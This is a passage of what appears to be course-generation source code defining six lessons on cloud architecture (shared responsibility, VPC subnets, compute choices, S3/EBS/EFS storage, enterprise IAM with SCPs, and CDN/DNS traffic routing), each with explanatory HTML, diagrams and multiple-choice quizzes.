            1, "mental-model-cloud-shared-responsibility", "The Mental Model of Cloud: Elasticity and Shared Responsibility", "Cloud Foundations",
            "Deconstructing the cloud: virtualized multi-tenant infrastructure, on-demand elasticity, and the AWS Shared Responsibility Model.",
            "What is the 'Shared Responsibility Model' in public cloud computing?",
            ["A security framework defining that the cloud provider manages security OF the cloud (hardware, datacenters), while the customer manages security IN the cloud (data, IAM, firewalls)", "The customer and provider split the electric bill", "Both parties write code together", "A model where nobody is responsible"],
            0, "The provider secures underlying hardware and facilities; the customer secures data, network routing, IAM, and applications.",
            [
                "<p>The cloud is not magic; <strong>the cloud is someone else's computer</strong>. But what makes cloud computing revolutionary is not the hardware; it is <strong>APIs, programmability, and on-demand elasticity</strong>. Instead of ordering physical servers and waiting 6 weeks for delivery, an engineer calls an API to provision 1,000 servers in 60 seconds.</p>",
                "<p>Foundations of Cloud Architecture:</p>",
                "<ul><li><strong>1. On-Demand Elasticity:</strong> Scaling compute dynamically with real-time demand. Pay for what you use by the second, and decommission resources when idle to prevent waste.</li><li><strong>2. The Shared Responsibility Model:</strong><ul><li><em>Security OF the Cloud (Provider's Job):</em> Physical data center security, hardware replacement, power supplies, fiber optic cables, and the hypervisor layer.</li><li><em>Security IN the Cloud (Customer's Job):</em> Customer data, operating system updates (on VMs), network firewall rules (Security Groups), identity access policies (IAM), and application code!</li></ul></li><li><strong>3. Regions and Availability Zones (AZs):</strong> An <strong>AWS Region</strong> (e.g. `us-east-1`) consists of multiple physically isolated, independent data centers called <strong>Availability Zones (AZs)</strong> connected by ultra-low-latency fiber. True high availability requires multi-AZ deployment!</li></ul>",
                "<pre><code># The Shared Responsibility Division:\n# [Customer Responsibility (Security IN the Cloud)]\n# ├── Customer Data & Encryption\n# ├── IAM Permissions & Access Keys\n# ├── Application Logic & Dependencies\n# └── Security Group Firewall Ingress Rules\n#\n# [Provider Responsibility (Security OF the Cloud)]\n# ├── Physical Data Center Security & Generators\n# ├── Host Hardware & Storage Disks\n# └── Virtualization Hypervisor Infrastructure</code></pre>",
                "<div class=\"callout\"><p><strong>The Misconfiguration Reality:</strong> 99% of cloud security breaches are not caused by cloud provider flaws; they are caused by customer misconfigurations (like open S3 buckets or 0.0.0.0/0 firewall ingress).</p></div>"
            ],
            "The Shared Responsibility Model", "Security OF the cloud vs Security IN the cloud",
            [
                {"title": "Provider: Security OF Cloud", "lines": ["Data center facilities, physical servers", "Power, cooling, network backbones", "Hardware hypervisor maintenance"]},
                {"title": "Customer: Security IN Cloud", "lines": ["Data encryption, IAM policies, access keys", "Firewall rules (Security Groups), VPC subnets", "Application code & container patching"]}
            ],
            "Regions and Availability Zones", "Physical geographic fault boundaries",
            [
                {"title": "Cloud Region (e.g. us-east-1)", "lines": ["Geographic location with isolated power grids"]},
                {"title": "Availability Zone A (AZ-A)", "lines": ["Independent physical data center facility"]},
                {"title": "Availability Zone B (AZ-B)", "lines": ["Redundant facility 20 miles away", "Survives flood/fire in AZ-A!"]}
            ],
            "Complete the cloud foundations sentence",
            "The cloud shared responsibility model dictates that providers secure physical infrastructure while customers remain responsible for data encryption, IAM, and {1} security {2}.",
            [
                {"answer": "network", "hint": "VPCs, subnets, and firewalls", "options": ["network", "formatting", "licensing"]},
                {"answer": "rules", "hint": "Security group ingress configurations", "options": ["rules", "hardware", "monitors"]}
            ],
            [
                {"q": "Under the AWS Shared Responsibility Model, who is responsible for ensuring that a production PostgreSQL database table is encrypted at rest?",
                 "a": ["The customer (by enabling encryption settings in AWS KMS / RDS configuration)", "AWS physical security guards", "The computer monitor manufacturer", "Nobody; encryption is impossible"],
                 "c": 0, "why": "Data configuration and encryption are customer responsibilities under the shared model."},
                {"q": "What is an 'Availability Zone' (AZ) in cloud infrastructure?",
                 "a": ["One or more discrete, physically separated data centers with redundant power, networking, and cooling within a geographic Region", "A time zone on a clock", "A website domain name", "A room in an office building"],
                 "c": 0, "why": "AZs are physically isolated facilities engineered to isolate failures from neighboring zones."},
                {"q": "Why is deploying an application across at least two Availability Zones (Multi-AZ) considered an enterprise standard?",
                 "a": ["If a catastrophic event (power outage, lightning strike, flood) disables one data center, traffic fails over seamlessly to the surviving AZ", "Multi-AZ makes websites load twice as fast", "Multi-AZ eliminates the need for software code", "It reduces cloud bills to zero"],
                 "c": 0, "why": "Multi-AZ architecture provides fault tolerance against physical datacenter disasters."},
                {"q": "What is the primary cause of modern cloud security breaches according to cybersecurity research?",
                 "a": ["Customer misconfigurations (such as overly permissive IAM roles, exposed credentials, or public cloud storage buckets)", "Flaws in physical server power supplies", "Physical break-ins at data centers", "Computer monitor defects"],
                 "c": 0, "why": "Misconfiguration of customer-managed cloud settings accounts for the vast majority of cloud breaches."}
            ],
            "You understand the mental model of cloud infrastructure, elasticity, and the shared responsibility model.",
            "Virtual Private Clouds (VPC): Subnets, Gateways, and Route Tables", "Design secure, isolated cloud networks with public and private subnets."
        ),
        build_lesson(
            2, "virtual-private-clouds-subnets-routing", "Virtual Private Clouds (VPC): Subnets, Gateways, and Route Tables", "VPC Networking",
            "Virtual network architecture: CIDR blocks (`10.0.0.0/16`), public vs private subnets, Internet Gateways (IGW), NAT Gateways, and Security Groups.",
            "What is the architectural purpose of a 'Private Subnet' inside a Virtual Private Cloud (VPC)?",
            ["To isolate internal backends, databases, and microservices so they have NO public IP addresses and are physically unreachable from the public internet", "To hide the website from search engines", "To make network cables faster", "To save internet bandwidth"],
            0, "Private subnets lack public route tables and public IPs, protecting sensitive databases from direct internet exposure.",
            [
                "<p>When you spin up resources in the cloud, you must never throw them onto a shared public network. You must construct a <strong>Virtual Private Cloud (VPC)</strong>: a logically isolated virtual network dedicated exclusively to your cloud account.</p>",
                "<p>The Anatomy of a <strong>Production Three-Tier VPC</strong>:</p>",
                "<ul><li><strong>1. CIDR Block:</strong> The IP address range assigned to your VPC (e.g. `10.0.0.0/16` provides 65,536 private IP addresses).</li><li><strong>2. Public Subnets (DMZ):</strong> Subnets with a route table entry pointing to an <strong>Internet Gateway (IGW)</strong>: `0.0.0.0/0 -> igw-xxxx`. Resources have public IPs. Only load balancers (ALB) and ingress proxies reside here!</li><li><strong>3. Private Subnets (Application Tier):</strong> Subnets hosting backend microservices and Kubernetes nodes. <strong>Zero public IPs!</strong> To download updates from the internet, traffic routes outbound through a <strong>NAT Gateway</strong> located in the public subnet. Inbound connections from the internet are impossible!</li><li><strong>4. Isolated Data Subnets (Database Tier):</strong> Private subnets containing PostgreSQL and Redis. <strong>Zero internet access!</strong> Accessible exclusively from the Application Tier security group.</li></ul>",
                "<pre><code># The Three-Tier VPC Architecture:\n[Public Internet] \n       │ (Port 443)\n       ▼\n[Public Subnet: Internet Gateway (IGW)] ──> [Application Load Balancer (ALB)]\n                                                     │ (Private IP 10.0.1.15)\n                                                     ▼\n[Private App Subnet: NAT Gateway]       ──> [Backend API Containers]\n                                                     │ (Private IP 10.0.2.40)\n                                                     ▼\n[Isolated Data Subnet (NO INTERNET ROUTE)]──> [PostgreSQL RDS & Redis]</code></pre>",
                "<div class=\"callout\"><p><strong>The NAT Gateway Directionality:</strong> A NAT Gateway allows private instances to make <em>outbound</em> connections to the internet (e.g. downloading patches) while blocking the outside world from initiating <em>inbound</em> connections.</p></div>"
            ],
            "Three-Tier VPC Subnet Topology", "Public Ingress -> Private App -> Isolated Data",
            [
                {"title": "Public Subnet (10.0.1.0/24)", "lines": ["Route: 0.0.0.0/0 -> Internet Gateway (IGW)", "Hosts: Application Load Balancer & NAT Gateway", "Exposed to public internet (Ports 80/443)"]},
                {"title": "Private App Subnet (10.0.2.0/24)", "lines": ["Route: 0.0.0.0/0 -> NAT Gateway (Outbound only)", "Hosts: Backend API pods & workers", "Zero public IP addresses!"]},
                {"title": "Isolated Data Subnet (10.0.3.0/24)", "lines": ["Route: Local VPC ONLY (Zero internet routes!)", "Hosts: PostgreSQL RDS, Redis, Vector Databases", "Accessible strictly from App Subnet Security Group"]}
            ],
            "Security Groups vs Network ACLs", "Stateful instance firewalls vs stateless subnet filters",
            [
                {"title": "Security Groups (Instance Level)", "lines": ["Stateful: Inbound response automatically allowed out", "Permits explicit allow rules, default deny"]},
                {"title": "Network ACLs (Subnet Level)", "lines": ["Stateless: Evaluates inbound & outbound separately", "Subnet perimeter rulebook"]}
            ],
            "Complete the VPC sentence",
            "A three-tier VPC isolates databases in subnets with zero internet routing, while backend application instances communicate outbound using a {1} Gateway and receive inbound traffic via an Application Load {2}.",
            [
                {"answer": "NAT", "hint": "Network Address Translation gateway", "options": ["NAT", "HTML", "RAM"]},
                {"answer": "Balancer", "hint": "Traffic distribution ingress proxy (ALB)", "options": ["Balancer", "Compiler", "Driver"]}
            ],
            [
                {"q": "What component allows instances in a private subnet to make outbound HTTP requests (like downloading security patches) without having public IP addresses?",
                 "a": ["A NAT Gateway (Network Address Translation) placed in a public subnet", "An Internet Gateway directly attached to the private subnet", "A physical USB drive", "A Wi-Fi router"],
                 "c": 0, "why": "NAT Gateways translate private instance IPs to public IPs for outbound traffic while preventing unsolicited inbound connections."},
                {"q": "What is the difference between a Security Group and a Network ACL (NACL) in AWS networking?",
                 "a": ["Security Groups are stateful virtual firewalls attached to individual instances/interfaces; NACLs are stateless firewall rules applied at the subnet boundary", "Security groups are paid; NACLs are free", "Security groups only work on Windows", "They are identical tools"],
                 "c": 0, "why": "Security groups operate statefully at the instance/ENI level; NACLs evaluate traffic statelessly at the subnet boundary."},
                {"q": "Why is a Security Group considered 'Stateful'?",
                 "a": ["If an inbound packet is allowed in, the corresponding outbound response is automatically permitted regardless of outbound rules", "It saves state to a hard drive", "It remembers user passwords", "It runs on stateful computers"],
                 "c": 0, "why": "Stateful firewalls automatically track connection state, allowing reciprocal response traffic automatically."},
                {"q": "What does a CIDR block of '10.0.0.0/16' indicate about the network IP capacity?",
                 "a": ["The network has a 16-bit subnet mask, providing 65,536 available internal private IPv4 addresses", "The network can only have 16 computers", "The network runs at 16 Mbps", "The network cost is $16 per month"],
                 "c": 0, "why": "A /16 prefix leaves 16 bits for host addresses ($2^{16} = 65,536$ total IP addresses)."}
            ],
            "You know how to design isolated multi-tier Virtual Private Clouds with public and private subnets.",
            "Compute Paradigms: Virtual Machines, Serverless, and Kubernetes", "Choose the right compute abstraction: EC2 vs Lambda vs EKS."
        ),
        build_lesson(
            3, "compute-paradigms-vms-serverless-k8s", "Compute Paradigms: Virtual Machines, Serverless, and Kubernetes", "Compute Paradigms",
            "The compute spectrum: Infrastructure as a Service (EC2), Function as a Service (AWS Lambda), and Container Orchestration (Kubernetes/EKS).",
            "When should an engineering team choose Serverless Functions (AWS Lambda) over persistent Kubernetes clusters?",
            ["For event-driven, sporadic, or bursty workloads that need instant auto-scaling to zero when idle with zero infrastructure maintenance overhead", "For hosting heavy 70B parameter models requiring 24/7 GPU memory", "For running legacy operating systems", "Serverless should always be used for everything"],
            0, "Serverless excels at sporadic, event-driven tasks that benefit from scaling to zero with zero server maintenance.",
            [
                "<p>Cloud compute is not a single product; it is a <strong>spectrum of abstraction</strong>. Choosing the wrong compute paradigm results in either massive operational overhead (managing operating systems) or crippling architectural limitations (serverless timeouts and cold starts).</p>",
                "<p>The Three Primary Cloud Compute Paradigms:</p>",
                "<ul><li><strong>1. Virtual Machines (IaaS — AWS EC2):</strong> Maximum control. You manage the OS, kernel tuning, custom GPU drivers, and local NVMe storage. <em>Trade-off:</em> High operational overhead: you must patch the OS, configure autoscaling groups, and pay 24/7 even when traffic is low. Ideal for heavy ML model training and dedicated GPU serving clusters.</li><li><strong>2. Serverless / FaaS (AWS Lambda, Google Cloud Functions):</strong> Zero server management. Upload code; the cloud executes it in response to events (HTTP request, S3 file upload). <strong>Scales to zero when idle (zero cost!)</strong> and scales to 1,000 instances in seconds. <em>Trade-off:</em> Execution time capped at 15 minutes; suffers from 'cold starts'; unsuitable for persistent GPU weights.</li><li><strong>3. Container Orchestration (CaaS — Kubernetes / AWS EKS):</strong> The enterprise sweet spot. Packages microservices into standardized containers with automated scheduling, self-healing restarts, service discovery, and declarative scaling.</li></ul>",
                "<pre><code># The Compute Decision Matrix:\n# Workload Type                  | Optimal Paradigm       | Why?\n# ----------------------------------------------------------------------------------\n# High-traffic Web API / Svc     | Kubernetes (EKS / ECS) | Predictable cost, fast scaling, rich networking\n# Webhook processor / Cron job   | Serverless (Lambda)    | Scales to zero, zero idle cost, event-driven\n# Heavy LLM Fine-Tuning / vLLM   | Dedicated VM (EC2 GPU) | Direct hardware access, persistent GPU memory</code></pre>",
                "<div class=\"callout\"><p><strong>The Cold Start Reality:</strong> A Serverless function takes 200ms to 2s to initialize a new runtime on cold invocation. Never use serverless for latency-critical sub-100ms APIs unless provisioned concurrency is enabled.</p></div>"
            ],
            "The Cloud Compute Spectrum", "Balancing operational control with managed abstraction",
            [
                {"title": "Virtual Machines (EC2)", "lines": ["Control: Full OS & Kernel access", "Scaling: Auto-Scaling Groups (Minutes)", "Cost: Billed 24/7 per second (No scale-to-zero)", "Best for: GPU model training & custom kernels"]},
                {"title": "Containers (EKS / ECS)", "lines": ["Control: Container runtime & environment", "Scaling: Horizontal Pod Autoscaler (Seconds)", "Cost: Billed for cluster node capacity", "Best for: Microservices & distributed web backends"]},
                {"title": "Serverless (Lambda)", "lines": ["Control: Pure application code only", "Scaling: Instant concurrent invocations", "Cost: $0.00 when idle (Scales to zero!)", "Best for: Webhooks, event triggers, cron jobs"]}
            ],
            "Scale-to-Zero vs Persistent Provisioning", "Financial trade-offs across paradigms",
            [
                {"title": "Sporadic Traffic (10 calls/hr)", "lines": ["EC2: Pays $50/mo to sit idle 99% of time", "Lambda: Pays $0.01/mo strictly for 10 executions!"]}
            ],
            "Complete the compute paradigms sentence",
            "The compute spectrum balances control against management overhead, ranging from full-control Virtual Machines to containerized Kubernetes and event-driven {1} functions that scale to {2} when idle.",
            [
                {"answer": "serverless", "hint": "Function-as-a-Service cloud compute", "options": ["serverless", "formatting", "licensing"]},
                {"answer": "zero", "hint": "No active instances or cost when traffic ceases", "options": ["zero", "maximum", "infinity"]}
            ],
            [
                {"q": "What is a 'Cold Start' in Serverless computing (AWS Lambda)?",
                 "a": ["The initial latency delay required for the cloud provider to allocate an execution sandbox, download code, and initialize the runtime on the first request", "Starting a computer in winter", "A reboot of the data center", "A cold beverage in the office"],
                 "c": 0, "why": "Cold starts represent the container provisioning and initialization delay on first invocation."},
                {"q": "Why is deploying a large 70-billion parameter language model to AWS Lambda generally impractical?",
                 "a": ["Lambda has strict memory limits (max 10GB RAM), execution timeouts (max 15 mins), and lacks dedicated persistent multi-GPU hardware attachments", "Lambda only supports HTML", "Lambda is illegal for AI", "Lambda runs in black and white"],
                 "c": 0, "why": "Heavy LLMs require persistent GPU VRAM (40GB-80GB+) and long-lived model serving memory."},
                {"q": "What is the primary operational advantage of Kubernetes (EKS) over managing individual EC2 virtual machines?",
                 "a": ["Kubernetes automates container scheduling, automated self-healing restarts of failed pods, rolling updates, and cluster packing", "Kubernetes makes servers free", "Kubernetes eliminates the need for software engineering", "Kubernetes runs without an operating system"],
                 "c": 0, "why": "Kubernetes abstracts infrastructure into a self-healing, declarative container orchestration platform."},
                {"q": "How does 'Fargate' simplify container management in AWS ECS and EKS?",
                 "a": ["It is a serverless compute engine for containers where AWS manages the underlying EC2 instances, eliminating host OS patching and cluster scaling", "It writes Dockerfiles automatically", "It deletes old code", "It turns off the internet"],
                 "c": 0, "why": "AWS Fargate runs containers serverlessly without requiring developers to manage underlying EC2 worker nodes."}
            ],
            "You know how to evaluate and choose between Virtual Machines, Serverless functions, and Kubernetes.",
            "Cloud Storage Hierarchy: Object, Block, and File Storage", "Select the optimal storage tier: S3 vs EBS vs EFS."
        ),
        build_lesson(
            4, "cloud-storage-hierarchy-s3-ebs-efs", "Cloud Storage Hierarchy: Object, Block, and File Storage", "Storage Hierarchy",
            "Data persistence in the cloud: Object Storage (S3), Block Storage (EBS), Shared File Systems (EFS), and lifecycle tiering.",
            "What is the fundamental architectural difference between Object Storage (Amazon S3) and Block Storage (Amazon EBS)?",
            ["Object storage is accessed via HTTP APIs and is infinitely scalable for static files; Block storage acts as a raw physical hard drive attached directly to a single compute instance", "Object storage is for text; block storage is for numbers", "They are identical storage services", "Block storage is free of charge"],
            0, "S3 is an HTTP-accessed, infinitely scalable key-value object store; EBS is a high-speed raw block device attached to a VM.",
            [
                "<p>Storing data in the cloud is not one-size-fits-all. Storing video uploads on a virtual machine's block disk will rapidly run out of space and cost 10x more than necessary. Conversely, trying to run a high-performance transactional database on S3 will fail due to lack of random write support.</p>",
                "<p>The Three Cloud Storage Tiers:</p>",
                "<ul><li><strong>1. Block Storage (Amazon EBS):</strong> Acts as a raw physical SSD/HDD attached directly to a single EC2 instance over high-speed PCI/network bus. Formatted with filesystems (`ext4`, `xfs`). Low latency (sub-millisecond), high IOPS. <em>Limitation:</em> Tied to a single Availability Zone; cannot be shared across multiple instances simultaneously. Ideal for <strong>database data files</strong>.</li><li><strong>2. Object Storage (Amazon S3):</strong> Unstructured key-value store accessed via HTTP REST APIs (`GET /bucket/key`). Infinitely scalable, 99.999999999% (11 nines) durability, replicated across multiple AZs automatically. Extremely cheap ($0.023/GB). <em>Limitation:</em> You cannot modify part of an object (must overwrite entire object). Ideal for <strong>media assets, backups, datasets, and static files</strong>.</li><li><strong>3. Shared File Storage (Amazon EFS / NFS):</strong> A POSIX-compliant shared network filesystem that can be mounted simultaneously by hundreds of EC2 instances and Kubernetes pods!</li></ul>",
                "<pre><code># The Storage Selection Matrix:\n# Workload                               | Optimal Storage Tier | Why?\n# ------------------------------------------------------------------------------------\n# PostgreSQL Database Engine files       | EBS (gp3 / io2)      | Low latency, sub-ms random reads/writes, high IOPS\n# User Profile Pictures & PDF uploads    | S3 Standard          | Infinitely scalable, HTTP accessible, cheap, durable\n# Shared ML training dataset on 10 pods  | EFS / FSx for Lustre | Mounted across multiple concurrent instances\n# Old compliance audit logs (7-year keep)| S3 Glacier           | Deep archival tier, 90% cheaper ($0.004/GB)</code></pre>",
                "<div class=\"callout\"><p><strong>The Lifecycle Optimization Rule:</strong> Configure S3 Lifecycle Rules to transition files automatically: S3 Standard $\\rightarrow$ Infrequent Access (after 30 days) $\\rightarrow$ Glacier Deep Archive (after 90 days). Slashes storage bills by 80%.</p></div>"
            ],
            "The Three Storage Paradigms", "EBS (Block) vs S3 (Object) vs EFS (File)",
            [
                {"title": "Block Storage (EBS)", "lines": ["Direct-attached virtual hard drive", "Sub-millisecond latency, high IOPS", "Mounted to single EC2 instance (Databases)"]},
                {"title": "Object Storage (S3)", "lines": ["HTTP REST API accessible key-value store", "Infinite scale, 11 nines durability, ultra-cheap", "Best for: Images, backups, documents, datasets"]},
                {"title": "Shared File Storage (EFS)", "lines": ["POSIX network file system (NFS)", "Mounted concurrently by 100+ servers", "Best for: Shared content directories & CMS"]}
            ],
            "S3 Automated Lifecycle Tiering", "Automating storage cost optimization",
            [
                {"title": "Day 1-30: S3 Standard", "lines": ["Fast, frequent read access ($0.023/GB)"]},
                {"title": "Day 31-90: S3 Infrequent Access", "lines": ["Low-frequency access ($0.0125/GB)"]},
                {"title": "Day 90+: Glacier Deep Archive", "lines": ["Long-term compliance vault ($0.00099/GB - 95% off!)"]}
            ],
            "Complete the storage hierarchy sentence",
            "High-performance databases require low-latency {1} storage like EBS, while infinitely scalable static media and backups belong in {2} storage like Amazon S3.",
            [
                {"answer": "block", "hint": "Direct-attached virtual disk storage", "options": ["block", "formatting", "licensing"]},
                {"answer": "object", "hint": "HTTP-accessible key-value storage", "options": ["object", "hardware", "monitors"]}
            ],
            [
                {"q": "What durability guarantee does Amazon S3 offer for stored objects across multiple Availability Zones?",
                 "a": ["99.999999999% (11 nines) durability", "50% durability", "90% durability", "Durability is not guaranteed"],
                 "c": 0, "why": "S3 redundantly stores objects across multiple geographically separated AZs to achieve 11 nines durability."},
                {"q": "Can multiple EC2 virtual machines in different Availability Zones mount the same standard Amazon EBS volume simultaneously?",
                 "a": ["No; standard EBS volumes are bound to a single Availability Zone and can only be attached to one EC2 instance at a time", "Yes; EBS can be mounted by 1,000 instances", "Only on Windows", "Only on weekends"],
                 "c": 0, "why": "Standard EBS block devices operate as local drives attached to a single virtual instance in one AZ."},
                {"q": "What is the primary operational trade-off of storing files in Amazon S3 Glacier Deep Archive?",
                 "a": ["It is 95% cheaper than S3 Standard, but retrieving an object takes 3 to 12 hours rather than milliseconds", "It deletes files after 1 week", "Files cannot be downloaded", "It requires sending physical tapes"],
                 "c": 0, "why": "Glacier Deep Archive offers rock-bottom storage pricing in exchange for asynchronous multi-hour retrieval times."},
                {"q": "How does an S3 Pre-Signed URL allow a browser client to upload a video directly to S3 without passing through your application server?",
                 "a": ["The application server generates a cryptographically signed temporary URL granting direct upload permissions, freeing server bandwidth", "It makes the video public", "It converts the video to MP3", "It bypasses S3 security"],
                 "c": 0, "why": "Pre-signed URLs delegate secure direct uploads to S3, bypassing application server memory and network bottlenecks."}
            ],
            "You know how to architect cloud storage across Block (EBS), Object (S3), and File (EFS) tiers.",
            "IAM and Identity Federation at Enterprise Scale", "Govern enterprise cloud identity using IAM roles, policies, and SSO."
        ),
        build_lesson(
            5, "enterprise-iam-identity-federation", "IAM and Identity Federation at Enterprise Scale", "Enterprise IAM",
            "Enterprise access governance: AWS IAM architecture, Service Control Policies (SCPs), Permission Boundaries, and Single Sign-On (SSO).",
            "What is the function of a 'Service Control Policy' (SCP) in AWS Organizations?",
            ["A guardrail policy applied at the organization level that defines the maximum allowable permissions across member accounts, superseding local account admins", "A policy that controls employee work hours", "A firewall that blocks internet connections", "A billing receipt"],
            0, "SCPs act as organizational guardrails, restricting what member account administrators can do.",
            [
                "<p>In a startup with 3 engineers, managing one AWS account with individual IAM users works. But in an enterprise with 500 engineers, 50 microservices, and 20 AWS accounts (Production, Staging, Security, Data), creating individual IAM users is an unmanageable security disaster.</p>",
                "<p><strong>Enterprise IAM Architecture</strong> is governed by centralized federation:</p>",
                "<ul><li><strong>1. Multi-Account Strategy (AWS Organizations):</strong> Separate workloads into isolated AWS accounts (e.g. `Account-Prod`, `Account-Dev`, `Account-Audit`). Blast radius is strictly isolated!</li><li><strong>2. Single Sign-On (AWS IAM Identity Center / Okta):</strong> <strong>Zero IAM users in production accounts!</strong> Human engineers authenticate through corporate Single Sign-On (Okta / Google Workspace with MFA) and assume temporary roles dynamically.</li><li><strong>3. Service Control Policies (SCPs):</strong> Guardrails enforced from the parent organization: <code>Deny: ec2:StopLogging</code> or <code>Deny: * IF aws:RequestedRegion NOT IN [us-east-1, eu-west-1]</code>. Even a root account admin cannot bypass an SCP!</li><li><strong>4. Permission Boundaries:</strong> Advanced IAM guardrails that cap the maximum permissions a delegated developer can grant when creating new IAM roles.</li></ul>",
                "<pre><code># Service Control Policy (SCP) Enforcing Geographic Region Guardrail:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenyAllOutsideApprovedRegions\",\n      \"Effect\": \"Deny\",\n      \"NotAction\": [\n        \"iam:*\", \"organizations:*\", \"route53:*\", \"cloudfront:*\"\n      ],\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringNotEquals\": {\n          \"aws:RequestedRegion\": [\"us-east-1\", \"us-west-2\"]\n        }\n      }\n    }\n  ]\n}</code></pre>",
                "<div class=\"callout\"><p><strong>The Enterprise Identity Standard:</strong> Individual IAM users with static console passwords and long-lived access keys must be completely banned in production. Use centralized SSO and IAM Roles exclusively.</p></div>"
            ],
            "Multi-Account Organization Hierarchy", "Governing cloud accounts at enterprise scale",
            [
                {"title": "AWS Organizations Root", "lines": ["Service Control Policies (SCPs) enforced globally", "Blocks forbidden regions & security tampering"]},
                {"title": "Production OU (Account A)", "lines": ["Strict least privilege, read-only audit logging"]},
                {"title": "Development OU (Account B)", "lines": ["Sandbox account for experimentation", "Zero access to production customer data!"]}
            ],
            "Human Access via SSO", "Zero static credentials in production",
            [
                {"title": "Corporate Okta / Google SSO", "lines": ["Authenticates employee with hardware MFA"]},
                {"title": "IAM Identity Center", "lines": ["Assumes temporary 1-hour role in target account", "Zero permanent passwords stored in AWS!"]}
            ],
            "Complete the enterprise IAM sentence",
            "Enterprise identity governance bans individual IAM users in favor of centralized {1} integration, enforcing organization-wide guardrails using Service {2} Policies.",
            [
                {"answer": "SSO", "hint": "Single Sign-On authentication", "options": ["SSO", "HTML", "RAM"]},
                {"answer": "Control", "hint": "Service Control Policies (SCPs)", "options": ["Control", "Formatting", "Licensing"]}
            ],
            [
                {"q": "What happens if a local administrator in a member AWS account attempts to delete CloudTrail audit logs, but a parent SCP denies 'cloudtrail:DeleteTrail'?",
                 "a": ["The action is rejected with an explicit Access Denied error; Service Control Policies override all local account permissions", "The logs are deleted anyway", "The AWS account is deleted", "The computer restarts"],
                 "c": 0, "why": "SCPs act as hard guardrails that cannot be overridden by local account administrators or root users."},
                {"q": "Why is separating production and development into distinct AWS accounts better than separating them using IAM tags in one account?",
                 "a": ["Account boundaries provide absolute physical, network, billing, and IAM isolation, guaranteeing a bug or breach in Dev cannot touch Prod", "Multiple accounts are free of charge", "Single accounts have a 10-user limit", "It is required by Python syntax"],
                 "c": 0, "why": "Account-level separation eliminates shared IAM and network risks, confining failures to isolated boundaries."},
                {"q": "What is an IAM 'Permission Boundary'?",
                 "a": ["An advanced control that sets the maximum allowable permissions an IAM entity can have, preventing delegated developers from escalating their own privileges", "A physical fence outside a data center", "A type of network router", "A database firewall"],
                 "c": 0, "why": "Permission boundaries prevent developers from creating administrator roles for themselves."},
                {"q": "How does centralized Single Sign-On (SSO) improve security when an employee leaves a company?",
                 "a": ["Deactivating the employee's corporate identity in Okta/Google instantly revokes their access across all 50 AWS accounts in one click", "The employee keeps access for 30 days", "An administrator must manually log into every account", "The servers must be rebooted"],
                 "c": 0, "why": "Centralized SSO ensures immediate, comprehensive offboarding across all cloud infrastructure."}
            ],
            "You know how to govern enterprise cloud identity using multi-account organizations, SCPs, and SSO.",
            "Global Traffic Management: CDN, Anycast DNS, and Load Balancers", "Distribute traffic globally with low latency and high availability."
        ),
        build_lesson(
            6, "global-traffic-management-cdn-dns-alb", "Global Traffic Management: CDN, Anycast DNS, and Load Balancers", "Global Traffic",
            "Routing traffic globally: Anycast DNS (Route 53), Content Delivery Networks (CloudFront/Cloudflare), and Application Load Balancers (ALB).",
            "How does a Content Delivery Network (CDN like Cloudflare or AWS CloudFront) slash latency for global users?",
            ["By caching static web assets and API responses on hundreds of Edge Point-of-Presence (PoP) servers located geographically close to the user", "By running faster fiber optic cables under oceans", "By speeding up the user's Wi-Fi router", "By compressing the user's hard drive"],
            0, "CDNs terminate TLS and serve cached assets from edge servers located within milliseconds of global users.",
            [
                "<p>The speed of light in fiber optic cables is a physical limit: a round trip packet from Sydney to Virginia takes <strong>200 milliseconds</strong>. If a user in Australia must wait 200ms for every TLS handshake, CSS file, and API call, your application feels broken.</p>",
                "<p><strong>Global Traffic Architecture</strong> solves the speed-of-light problem:</p>",
                "<ul><li><strong>1. Anycast DNS Routing (Amazon Route 53):</strong> Anycast uses BGP routing to broadcast a single IP address from dozens of data centers worldwide. DNS queries are resolved by the closest physical DNS server in <strong>under 10ms</strong>! Supports latency-based routing and automatic failover!</li><li><strong>2. Content Delivery Networks (CloudFront / Cloudflare):</strong> Terminates the TLS handshake at the local edge Point of Presence (PoP). Static HTML, CSS, images, and cached API responses are served directly from edge RAM.</li><li><strong>3. Application Load Balancers (ALB - Layer 7):</strong> Sits behind the CDN. Inspects HTTP path headers (`/api` $\\rightarrow$ API target group, `/images` $\\rightarrow$ S3) and distributes traffic across healthy container instances using round-robin or least-outstanding-requests.</li><li><strong>4. Network Load Balancers (NLB - Layer 4):</strong> Operates at the raw TCP/UDP layer. Handles millions of requests per second with ultra-low sub-millisecond latency.</li></ul>",
                "<pre><code># The Global Traffic Journey:\n[User in Tokyo]\n      │ (Resolves DNS in 8ms via Route 53 Anycast)\n      ▼\n[CloudFront Edge PoP (Tokyo)] ──(Cached Asset? Return in 12ms!)\n      │ (Cache Miss? Fast AWS Private Fiber Backbone transit)\n      ▼\n[AWS Region: us-east-1]\n      │ (Ingress)\n      ▼\n[Application Load Balancer (ALB)] ──(Distributes across healthy pods)\n      ├── Container Pod 1 (AZ-A: Healthy)\n      └── Container Pod 2 (AZ-B: Healthy)</code></pre>",
                "<div class=\"callout\"><p><strong>The Edge Termination Edge:</strong> Terminating TLS at the CDN edge saves 2 full round trips to the origin server, cutting page load times by half a second globally.</p></div>"
            ],
            "Global Traffic Routing Hierarchy", "From client to edge to origin load balancer",
            [
                {"title": "1. Anycast DNS (Route 53)", "lines": ["Resolves domain at nearest physical PoP in 10ms", "Latency-based routing & healthcheck failover"]},
                {"title": "2. CDN Edge Cache (CloudFront)", "lines": ["Terminates TLS handshake locally", "Serves cached static & API content in 15ms"]},
                {"title": "3. Application Load Balancer (ALB)", "lines": ["Layer 7 HTTP path routing (/api -> pods)", "Healthchecks ensure traffic goes to healthy nodes"]}
            ],
            "Layer 7 (ALB) vs Layer 4 (NLB)", "HTTP intelligence vs raw packet throughput",
            [
                {"title": "Application Load Balancer (L7)", "lines": ["HTTP/HTTPS, websockets, path routing", "SSL termination, cookie stickiness"]},
                {"title": "Network Load Balancer (L4)", "lines": ["Raw TCP/UDP, millions of req/sec", "Ultra-low sub-millisecond latency"]}
            ],
            "Complete the global traffic sentence",
            "Global traffic architecture uses Anycast DNS for fast resolution, Content Delivery Networks to terminate TLS and cache assets at the {1}, and {2} load balancers to distribute traffic across healthy compute nodes.",
            [
                {"answer": "edge", "hint": "Geographic point-of-presence servers", "options": ["edge", "formatting", "licensing"]},
